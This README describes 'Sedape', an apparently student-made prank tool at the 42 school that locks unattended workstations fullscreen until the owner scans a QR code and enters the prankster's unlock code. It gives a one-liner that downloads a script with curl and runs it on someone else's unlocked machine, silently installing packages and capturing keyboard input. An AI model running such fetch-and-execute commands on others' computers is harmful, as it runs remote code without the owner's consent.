# Sedape System 🍜
*Created as part of the 42 curriculum by traomeli.*

## What is this?

**Sedape** is a security awareness tool built for the 42 school community.

If you leave your workstation unlocked and walk away, someone might **sedape** you — your screen gets taken over with a full-screen warning image. To get your PC back, you need to find the person who did it and ask for the unlock code.

It sounds like a prank. It is. But it also teaches you to **always lock your screen**.

---

## How it works

```
croisant_lock.py  ──POST──▶  /api/request_lock     (registers the lock, gets a token)
                  ◀──JSON──  { "token": "a3f9bc12" }
                  ──GET───▶  /gen_image/<token>      (downloads image with QR code)
                  ──poll──▶  /api/status/<token>     (loops every 2s waiting for unlock)

Victim scans QR   ──GET───▶  /unlock/<token>         (awareness page)
                  ──POST──▶  enters name + code       (unlocks the PC)
                  ◀──────── script detects status=1, releases screen
```

---

## If you got sedaped

Your screen is now locked fullscreen. Here is what to do:

1. **Grab your phone** and scan the QR code displayed on your screen
2. You will land on a webpage — read it, it will explain why this happened
3. Scroll down and click **UNLOCK**
4. Enter the **name** of the person who sedaped you and their **unlock code**
5. If you don't know who did it — look around, they are probably watching 😄
6. Once the correct name and code are entered, your screen unlocks automatically

> **Emergency exit (for testing only):** press **F8** ten times in a row

---

## If you want to sedape someone

### Step 1 — Create your account

Go to **https://nary14.pythonanywhere.com/signup** and create an account.

- Pick your role: **TUTOR**, **STAFF** (restricted to 3 people), or **RANDOM GUY AT 42**
- Set your display name — this is what appears on the victim's screen
- Set your unlock code — the victim will need this to unlock their PC

### Step 2 — Get your command

Log in to your dashboard at **https://nary14.pythonanywhere.com**

You will see your personalized one-liner command ready to copy:

```bash
pip3 install --user Pillow qrcode && curl -s https://nary14.pythonanywhere.com/download/<your_username> -o /tmp/s.py && python3 /tmp/s.py
```

### Step 3 — Run it on the target machine

Wait for the person to leave their PC unlocked. Open a terminal and paste the command.

What happens next:
- Pillow and qrcode get installed silently
- The script downloads itself pre-configured with your account
- It contacts the server, registers a new lock session, and gets a unique token
- It downloads a personalized image with your name and a QR code
- The screen goes fullscreen and captures all keyboard input

The victim's PC now shows your sedape screen. Your dashboard will show the new entry in real time.

### Step 4 — Wait

Once the victim scans the QR, reads the awareness page, and enters your name and unlock code correctly — their screen unlocks automatically. You will see the status change to **LIBÉRÉ** on your dashboard.

---

## Dashboard

Everything is managed from **https://nary14.pythonanywhere.com**

| Section | What it does |
|---|---|
| Profile card | Shows your username, unlock code, and active lock count |
| Stats | Total sedapes, blocked vs unlocked |
| Command | Your one-liner ready to copy |
| Script download | Direct download of your pre-configured script |
| PC list | All your lock sessions with token, status, and timestamp |
| Preview | Live preview of what your sedape screen looks like |
| Settings | Change your display name and unlock code |

---

## Features

- **Multi-user** — every person has their own account and isolated lock sessions
- **Unique tokens** — each sedape generates a separate token, no conflicts between victims
- **Dynamic image** — generated on the fly with your name and a unique QR code
- **Awareness page** — victim reads a proper explanation before they can unlock
- **Real-time dashboard** — track all your locked PCs with live status updates
- **Pre-configured script** — downloads and runs with your account already embedded
- **Fullscreen + keyboard capture** — prevents easy bypass

---

## Security & Ethics

> This project is designed **for educational purposes only** within the 42 school culture.

- Only use this on 42 school machines, within the community
- The sedape is a friendly reminder, not a malicious attack
- Passwords are hashed, tokens are randomly generated, no sensitive data is stored
- The awareness page explains why screen locking matters

For real system-level locking: **Super+L** on Linux, **Win+L** on Windows, **Cmd+Ctrl+Q** on Mac.

---

**🔒 Lock your screen. Always. Even for 30 seconds.**
